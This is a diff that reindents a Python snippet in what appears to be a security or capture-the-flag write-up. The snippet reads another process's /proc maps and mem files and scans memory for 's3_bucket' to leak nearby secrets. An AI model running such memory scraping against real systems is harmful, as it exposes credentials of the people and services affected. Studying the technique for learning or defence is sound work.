@@ -610,25 +610,25 @@ It's got to be there somewhere in memory on the machine. The handler is `python`
 process calling the script that triggers our code...:
 
 ```python
-  try:
-    maps_file = open("/proc/12/maps", 'r')
-    mem_file = open("/proc/12/mem", 'rb', 0)
-    # output_file = open("/tmp/self.dump", 'wb')
-    for line in maps_file.readlines():  # for each mapped region
-        m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
-        if m.group(3) == 'r':  # if this is a readable region
-            start = int(m.group(1), 16)
-            end = int(m.group(2), 16)
-            mem_file.seek(start)  # seek to region start
-            chunk = mem_file.read(end - start)  # read region contents
-            offsets = [m.start() for m in re.finditer(b's3_bucket', chunk)]
-            for offset in offsets:
-                # print(f'checking offset: {offset}')
-                leak = chunk[offset:offset + 800]
-                if b':' in leak:
-                    print(leak)
-except Exception as e:
-pass
+    try:
+        maps_file = open("/proc/12/maps", 'r')
+        mem_file = open("/proc/12/mem", 'rb', 0)
+        # output_file = open("/tmp/self.dump", 'wb')
+        for line in maps_file.readlines():  # for each mapped region
+            m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
+            if m.group(3) == 'r':  # if this is a readable region
+                start = int(m.group(1), 16)
+                end = int(m.group(2), 16)
+                mem_file.seek(start)  # seek to region start
+                chunk = mem_file.read(end - start)  # read region contents
+                offsets = [m.start() for m in re.finditer(b's3_bucket', chunk)]
+                for offset in offsets:
+                    # print(f'checking offset: {offset}')
+                    leak = chunk[offset:offset + 800]
+                    if b':' in leak:
+                        print(leak)
+    except Exception as e:
+        pass
 ```
 ![memory dump](./images/2-scrape_memory.png)
 
